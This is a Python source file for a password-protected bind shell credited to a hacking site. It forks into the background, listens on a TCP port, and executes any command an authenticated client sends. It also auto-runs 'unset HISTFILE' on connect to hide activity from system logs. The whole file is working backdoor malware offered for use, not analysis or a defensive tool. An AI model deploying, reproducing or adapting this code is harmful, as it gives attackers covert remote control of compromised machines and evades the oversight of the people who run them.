#!/usr/bin/env python
#####################
#Coded by ~S/E/r/G~
#mailto:serg[dot]web-hack.ru
#version 1.2.1
#
#Use: python wh_bindshell.py [port] [password] | python wh_bindshell.py - for use
#                                               default_settings
#for make password:
#   python -c"import md5;x=md5.new('you_password');print x.hexdigest()"
#
#bugz: ctrl+c etc =script stoped=\ (after reconnect it work)

from socket import *
import os
import sys
import md5
import popen2

#############_Default_#####################
Port=50001                                #_default port
Pass ='ac0b72df8bd2939ca4d1466d11c9846b'  #_default password ='web-hack'
simvol='$ '                               #_prompt
autocommands="unset HISTFILE;uname -a;id" #autostart=)
kill_bsh='kbsh'                           #command for kill bindshell
##########################################
if len(sys.argv)>1:
    Port=int(sys.argv[1])
    print '[+]Port=',sys.argv[1]
    if len(sys.argv)>2:
        Pass=str(md5.new(sys.argv[2]).hexdigest())
	print '[+]New_pass'

try:
    sockobj=socket(AF_INET,SOCK_STREAM)
    sockobj.bind(('',Port))
    sockobj.listen(5)
except:
    print '[-]SocketError',sys.exc_value
    sys.exit(1)

if os.fork()==0: #for start bindshell as proc and exit
    while 1:
        connection,address=sockobj.accept()
        data=connection.recv(1024)
        getpass=md5.new(data[:-2])
        bsh_pid=os.getpid()
        if getpass.hexdigest()==Pass:
            if os.fork()==0:    
                info=os.popen(autocommands).read()
                connection.send(info)
                while 1:
                    data=connection.recv(1024)
                    if not data:break
                    if data[:-2]==kill_bsh:
                        os.popen('kill '+str(bsh_pid))
                        sys.exit(0)
                    cmd_res,stdin,stderror=popen2.popen3(data[:-2])
                    result= cmd_res.read()
                    error=stderror.read()
                    if error:
                        connection.send(error)       
                       
                    for i in range(len(data.split())-1):
                        if 'cd' in data.split()[i]:
                            try:                            
                                os.chdir(data.split()[i+1].split(';')[0])
                            except:
                                error='[-]Error '+str(sys.exc_value)+'\n'
                                connection.send(error)
    ###Prompt
                    username=os.popen("whoami").read()
                    adr=os.popen("uname -n").read()
                    if username[:-1]=='root':
                            simvol='# '
                    path=os.getcwd()
                    promt='['+username[:-1]+'@'+adr[:-1]+' '+path+']'+simvol
    ###                  
                    answer=result+promt
                    connection.send(answer)
        else:
               connection.close()             
sys.exit(0)
        
	    
	    
